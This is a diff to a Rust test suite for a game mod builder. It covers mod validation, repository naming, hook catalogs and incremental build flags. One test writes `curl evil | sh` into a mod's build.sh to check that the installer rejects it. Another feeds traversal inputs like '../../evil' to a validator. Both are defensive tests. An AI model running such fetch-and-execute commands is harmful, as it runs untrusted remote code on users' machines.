@@ -627,7 +627,11 @@ fn installed_mods_are_the_checked_files_of_those_turned_on() {
     let at = home.join(INSTALLED).join("waddles_translated");
     write_bundle(&at, "waddles_translated", "fn hook() {}");
     fs::create_dir_all(at.join("code-waddles-0/src")).unwrap();
-    fs::write(at.join("code-waddles-0/Cargo.toml"), "[package]\nname = \"code\"\n").unwrap();
+    fs::write(
+        at.join("code-waddles-0/Cargo.toml"),
+        "[package]\nname = \"code\"\n",
+    )
+    .unwrap();
     fs::write(at.join("code-waddles-0/src/lib.rs"), "pub fn f() {}").unwrap();
     fs::create_dir_all(at.join("content/assets")).unwrap();
     fs::write(at.join("content/assets/waddles.png"), b"png").unwrap();
@@ -650,7 +654,10 @@ fn installed_mods_are_the_checked_files_of_those_turned_on() {
         )]
     );
     fs::write(at.join("build.sh"), "curl evil | sh").unwrap();
-    assert!(installed_mods(&home).is_err(), "only sources, manifests and data");
+    assert!(
+        installed_mods(&home).is_err(),
+        "only sources, manifests and data"
+    );
 }
 
 #[test]
@@ -675,8 +682,18 @@ fn a_translated_mod_names_the_repositories_it_builds_from() {
         Some("GUNNA-at/horizon-mixins")
     );
     assert_eq!(found.mixins.as_deref(), Some(mixins.as_str()));
-    for bad in ["../../evil", "owner", "owner/name/more", "owner/.hidden", "o w/n"] {
-        fs::write(d.join(SOURCE_FILE), format!("horizon_repository = \"{bad}\"\n")).unwrap();
+    for bad in [
+        "../../evil",
+        "owner",
+        "owner/name/more",
+        "owner/.hidden",
+        "o w/n",
+    ] {
+        fs::write(
+            d.join(SOURCE_FILE),
+            format!("horizon_repository = \"{bad}\"\n"),
+        )
+        .unwrap();
         assert!(bundle(&d, None).is_err(), "{bad}");
     }
 }
@@ -692,6 +709,9 @@ fn mods_build_from_the_one_repository_they_name() {
         hooks: None,
         repository: repo.map(str::to_owned),
         mixins_repository: None,
+        injections: Vec::new(),
+        api: None,
+        mixins_content: false,
     };
     fn get(b: &Bundle) -> Option<&String> {
         b.repository.as_ref()
@@ -706,7 +726,10 @@ fn mods_build_from_the_one_repository_they_name() {
         repository(&both, "Horizon", get, upstream).unwrap(),
         "fork/horizon"
     );
-    let apart = [named("a", Some("one/horizon")), named("b", Some("two/horizon"))];
+    let apart = [
+        named("a", Some("one/horizon")),
+        named("b", Some("two/horizon")),
+    ];
     let error = repository(&apart, "Horizon", get, upstream).unwrap_err();
     assert!(
         error.contains("a → one/horizon") && error.contains("b → two/horizon"),
@@ -720,7 +743,11 @@ fn a_source_between_releases_gets_its_pending_hook_points() {
     let catalog = r#"{"hooks": [{"name": "tick", "version": 2, "target": "game::tick"}]}"#;
     fs::write(d.join(CATALOG), catalog).unwrap();
     complete_catalog(&d).unwrap();
-    assert_eq!(fs::read_to_string(d.join(CATALOG)).unwrap(), catalog, "no fragments");
+    assert_eq!(
+        fs::read_to_string(d.join(CATALOG)).unwrap(),
+        catalog,
+        "no fragments"
+    );
     fs::create_dir_all(d.join(FRAGMENTS)).unwrap();
     fs::write(
         d.join(FRAGMENTS).join("spawning.json"),
@@ -729,20 +756,73 @@ fn a_source_between_releases_gets_its_pending_hook_points() {
     .unwrap();
     fs::write(
         d.join(FRAGMENTS).join("actors.json"),
-        r#"{"hooks": [{"name": "act", "target": "game::act", "cancellable": true}], "rust_summary": "", "doc_summary": ""}"#,
+        r#"{"hooks": [{"name": "act", "target": "game::act", "cancellable": true, "mod_api": false}], "rust_summary": "", "doc_summary": "act"}"#,
     )
     .unwrap();
     complete_catalog(&d).unwrap();
-    let text = fs::read_to_string(d.join(CATALOG)).unwrap();
-    let catalog: serde_json::Value = serde_json::from_str(&text).unwrap();
+    let json = |path: PathBuf| -> serde_json::Value {
+        serde_json::from_str(&fs::read_to_string(path).unwrap()).unwrap()
+    };
+    // Each with what its fragment says of it: the game's build script asks every hook point for
+    // its `mod_api`, and leaves out one that says `false` (a translated mod's, with no typed API).
     assert_eq!(
-        catalog["hooks"],
+        json(d.join(CATALOG))["hooks"],
         serde_json::json!([
             {"name": "tick", "version": 2, "target": "game::tick"},
-            {"name": "act", "version": 1, "target": "game::act", "cancellable": true},
+            {"name": "act", "version": 1, "target": "game::act", "cancellable": true, "mod_api": false},
             {"name": "spawn", "version": 1, "target": "game::spawn", "side": "server"},
         ])
     );
+    // A stamped fragment keeps its texts alone, as after a release: the build script reads the
+    // catalog and the fragments both, and refuses a name it finds in both.
+    assert_eq!(
+        json(d.join(FRAGMENTS).join("actors.json")),
+        serde_json::json!({"hooks": [], "rust_summary": "", "doc_summary": "act"})
+    );
+    assert_eq!(
+        json(d.join(FRAGMENTS).join("spawning.json"))["hooks"],
+        serde_json::json!([])
+    );
+    // Stamped once: a second pass over the same source changes nothing.
+    let stamped = fs::read_to_string(d.join(CATALOG)).unwrap();
+    complete_catalog(&d).unwrap();
+    assert_eq!(fs::read_to_string(d.join(CATALOG)).unwrap(), stamped);
+}
+
+/// A translated pack's Rust (Create's alone is about 150 MB) builds without incremental
+/// compilation, which keeps each crate's analysis besides its code: tens of gigabytes that save
+/// nothing, since a translation rewrites its crates whole. A mod of its own code stays far below
+/// the limit and builds incrementally.
+#[test]
+fn a_translated_mods_build_is_not_incremental() {
+    let stage = dir("stage-incremental");
+    let args = |incremental: bool| -> Vec<String> {
+        let rust = &toolchains("/rust/1.99.1-x")[0];
+        let cmd = compile(
+            rust,
+            &stage,
+            Target::Client,
+            Path::new("/native/target"),
+            Profile::Performance,
+            "horizon-client",
+            incremental,
+        );
+        cmd.get_args()
+            .map(|a| a.to_string_lossy().into_owned())
+            .collect()
+    };
+    let off = args(false);
+    let at = off
+        .iter()
+        .position(|a| a == "profile.fast.incremental=false");
+    assert!(at.is_some_and(|i| off[i - 1] == "--config"), "{off:?}");
+    assert!(!args(true).iter().any(|a| a.ends_with("incremental=false")));
+    let mods = dir("rust-bytes");
+    fs::create_dir_all(mods.join("small/src")).unwrap();
+    fs::write(mods.join("small/src/lib.rs"), "pub fn f() {}").unwrap();
+    fs::write(mods.join("small/notes.json"), vec![b' '; 1 << 20]).unwrap();
+    assert_eq!(rust_bytes(&mods), 13);
+    assert!(rust_bytes(&mods) <= INCREMENTAL_LIMIT);
 }
 
 #[test]
@@ -799,6 +879,8 @@ fn a_pin_chooses_the_commit_unless_the_player_builds_on_the_picked_version() {
         injections: Vec::new(),
         api: None,
         mixins_content: false,
+        repository: None,
+        mixins_repository: None,
     };
     // A: the pin (an older Nightly); B: the Nightly the player picked.
     let picked = || -> Result<String, String> { Ok(B.into()) };
@@ -837,6 +919,8 @@ fn only_a_pinned_mod_left_out_for_its_version_moves_the_build() {
         injections: Vec::new(),
         api: None,
         mixins_content: false,
+        repository: None,
+        mixins_repository: None,
     };
     let mods = [
         bundle("freecam_plus", Some(A), None),
@@ -874,6 +958,8 @@ fn mods_made_for_different_revisions_build_on_the_newest() {
         injections: Vec::new(),
         api: None,
         mixins_content: false,
+        repository: None,
+        mixins_repository: None,
     };
     let c = "c".repeat(40);
     // a is the oldest commit, then b, then c.
@@ -980,6 +1066,8 @@ fn mods_on_the_hook_points_follow_the_game_or_the_pins() {
         injections: Vec::new(),
         api: None,
         mixins_content: false,
+        repository: None,
+        mixins_repository: None,
     };
     let c = "c".repeat(40);
     // A (the game) has hook points v1, B v2, C none.
@@ -1040,6 +1128,8 @@ fn mods_needing_newer_hook_points_move_the_build_to_the_installed_game() {
         injections: Vec::new(),
         api: None,
         mixins_content: false,
+        repository: None,
+        mixins_repository: None,
     };
     let (c, d) = ("c".repeat(40), "d".repeat(40));
     // A (the old build's revision) has hook points v1, B (the installed game) v7.
@@ -1106,6 +1196,8 @@ fn named_hook_points_need_the_revisions_catalog() {
         injections: Vec::new(),
         api: None,
         mixins_content: true,
+        repository: None,
+        mixins_repository: None,
     };
     // A (the pin) has hook points v2 and no catalog; B (the game) v359 and one.
     let at = |r: &str| match r.as_bytes()[0] {
@@ -1401,6 +1493,7 @@ fn a_server_build_compiles_headless_with_its_own_key() {
                     Path::new("/native/target"),
                     Profile::Performance,
                     "horizon-client",
+                    true,
                 );
                 args_after_host(rust, &cmd)
             })
@@ -1974,6 +2067,7 @@ fn compiles_outside_the_players_cargo_configuration(rust: &Toolchain) {
         Path::new("/native/target"),
         Profile::Performance,
         "horizon-client",
+        true,
     );
     let args = args_after_host(rust, &cmd);
     assert_eq!(
@@ -2001,6 +2095,7 @@ fn compiles_outside_the_players_cargo_configuration(rust: &Toolchain) {
         Path::new("/native/target"),
         Profile::Performance,
         "horizon-client",
+        true,
     );
     let args = args_after_host(rust, &cmd);
     assert_eq!(args[1], "--config");
@@ -2039,6 +2134,7 @@ fn the_game_build_is_the_official_game_where_the_revision_has_it() {
             Path::new("/native/target"),
             Profile::Performance,
             api::OFFICIAL,
+            true,
         );
         let args = args_after_host(&rust, &cmd);
         assert!(args.ends_with(&["-p", api::OFFICIAL, "--bin", api::OFFICIAL].map(String::from)));
@@ -2076,6 +2172,7 @@ fn builds_fall_back_to_release_where_the_source_has_no_fast_profile() {
                     Path::new("/native/target"),
                     profile,
                     "horizon-client",
+                    true,
                 );
                 args_after_host(rust, &cmd)
             })
